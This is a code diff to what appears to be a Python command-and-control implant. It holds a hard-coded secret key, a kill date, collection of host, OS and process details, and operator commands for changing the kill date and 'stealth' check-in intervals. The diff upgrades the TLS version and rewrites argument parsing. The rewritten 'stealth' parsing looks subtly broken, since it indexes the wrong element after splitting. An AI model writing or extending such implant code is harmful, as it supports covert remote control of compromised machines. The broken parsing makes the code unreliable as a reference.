@@ -28,7 +28,7 @@ AGENT_PAGE      = "/main.css"
 SLEEP_TIME1     = 2
 SLEEP_TIME2     = 5
 SECRET_KEY      = '000000000000000116s92k48dss923j640s234v849c2001qi231d950g3s9df01esdr'
-SSL_VERSION     = ssl.PROTOCOL_TLSv1
+SSL_VERSION     = ssl.PROTOCOL_TLSv1_2
 KILL_DATE       = datetime(2020,6,11)
 
 ################################################
@@ -37,7 +37,7 @@ KILL_DATE       = datetime(2020,6,11)
 HOSTNAME        = node().strip()
 OS_VERSION      = system().strip() + release().strip()
 PID             = getpid()
-TYPE            = "python"
+TYPE            = "py"
 PROTOCOL        = "HTTPS"
 
 ################################################
@@ -130,8 +130,7 @@ def cmd_handler(cmd):
         # Change kill date: change_date year,month,day
         elif "change_date" in cmd:
             try:
-                kd = cmd.split(" ")
-                t = kd[1].split(",")
+                t = cmd.split(" ")[1].split("-")
                 KILL_DATE = datetime(int(t[0]),int(t[1]),int(t[2]))
                 resp = "[+] kill date changed to {0}".format(KILL_DATE)
             except:
@@ -140,7 +139,7 @@ def cmd_handler(cmd):
         # Change checkin intervals: stealth int1 int2
         elif "stealth" in cmd:
             try:
-                t = cmd.split(" ")
+                t = cmd.split(" ")[1].split("-")
                 # Global needed to modify var
                 global SLEEP_TIME1, SLEEP_TIME2
                 SLEEP_TIME1 = int(t[1])
